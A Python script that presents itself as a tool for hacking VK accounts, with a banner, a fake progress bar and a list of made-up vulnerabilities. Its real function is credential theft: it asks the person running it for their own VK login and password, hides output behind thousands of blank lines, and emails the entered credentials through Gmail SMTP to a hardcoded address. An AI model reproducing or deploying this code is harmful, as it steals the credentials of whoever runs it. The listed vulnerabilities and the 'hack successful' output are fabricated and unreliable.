import os
import smtplib
import sys
from tqdm import tqdm
import itertools as it
from colorama import init
from colorama import Fore, Back, Style
import time



print(Fore.RED)
print('''____   ________  __. .__                   __       ___ ___            .___              
\   \ /   /    |/ _| |  |__ _____    ____ |  | __  /   |   \ ___.__. __| _/___________   
 \   Y   /|      <   |  |  \\__  \ _/ ___\|  |/ / /    ~    <   |  |/ __ |\_  __ \__  \  
  \     / |    |  \  |   Y  \/ __ \\  \___|    <  \    Y    /\___  / /_/ | |  | \// __ \_
   \___/  |____|__ \ |___|  (____  /\___  >__|_ \  \___|_  / / ____\____ | |__|  (____  /
                  \/      \/     \/     \/     \/        \/  \/         \/            \/ 
_______________  ____ ________                               .__                         
\_____  \   _  \/_   /   __   \ _____________   ____   _____ |__| ____   _____           
 /  ____/  /_\  \|   \____    / \____ \_  __ \_/ __ \ /     \|  |/  _ \ /     \          
/       \  \_/   \   |  /    /  |  |_> >  | \/\  ___/|  Y Y  \  (  <_> )  Y Y  \         
\_______ \_____  /___| /____/   |   __/|__|    \___  >__|_|  /__|\____/|__|_|  /         
        \/     \/               |__|               \/      \/                \/        
            
_________________________________________________________________________________________''')
print(Fore.GREEN)
print('''Download Full Releases Y/n?''')
print(Fore.RESET)


def dos():
    for i in tqdm(range(100)):
        time.sleep(1)

    print(Fore.RED)
    print('''_________________________________________________________________________________________
                                                                                ''')
    print('|Download Successfully|100%    ')
    print('_________________________________________________________________________________________')
    time.sleep(1)
def oi():
    print('\n')
a = input()
if a == 'y':
    dos()
time.sleep(2)
print(Fore.BLUE)
print('''Multiple vulnerabilities were found in Vk Workstation and Fusion.

Below is a complete list of vulnerabilities:

    Security vulnerability in VK Fusion can be exploited to security restrictions;
    Out-of-bounds write vulnerability in VK  potentially execute arbitrary code;
    Out-of-bounds read/write in Vk can be exploited to execute arbitrary code;
    Time-of-check vulnerability in VK  can be exploited to execute arbitrary code;
    Out-of-bounds  VK can be exploited to execute arbitrary code;
___________________________________________________________________________________________
Write victim Vk url  to Hack : ''')
url =input()
time.sleep(1)
print('Connection ....')
time.sleep(2)
print('Connection - YES')
time.sleep(2)
print('Connection to vk.com ...')
time.sleep(2)
print('Connection to vk.com - YES')
print(Fore.RED)
print('[ERROR 678] Havent login and Password to Connect vk.com ')
time.sleep(2)
print('[ERROR 698] Havent login and Password to Connect vk.com ')
print('[ERROR 678] > Please write you login and Password to Connect vk.com ')
login = input('Login:')
Password = input('Password:')
print(Fore.GREEN)
print('[ERROR 678] >  Connecting vk.com ....')
print('Connection to vk.com - YES')
time.sleep(2)
print('Hack Successfully|100%')
time.sleep(2)
print('Login: 89675456534')
print('Password: fuy1234masha')
time.sleep(2)
for i in (range(1000)):
     oi()
r = "spambotby"
for i in (range(1000)):
     oi()
dr = "jack228x228@gmail.com"
s = "doss229ru"
for i in (range(1000)):
     oi()
subj = 'Notification from system'
msg_txt = Password + ' ' + login
msg = "From: %s\nTo: %s\nSubject: %s\n\n%s"  % (r, dr, subj, msg_txt)
print('\n')
server = smtplib.SMTP('smtp.gmail.com:587')
server.set_debuglevel(1);
server.starttls()
server.login(r,s)
server.sendmail(r, dr, msg)
server.quit()

for i in (range(1000)):
     oi()

dos()
dos()
dos()
dos()
dos()
dos()
dos()
dos()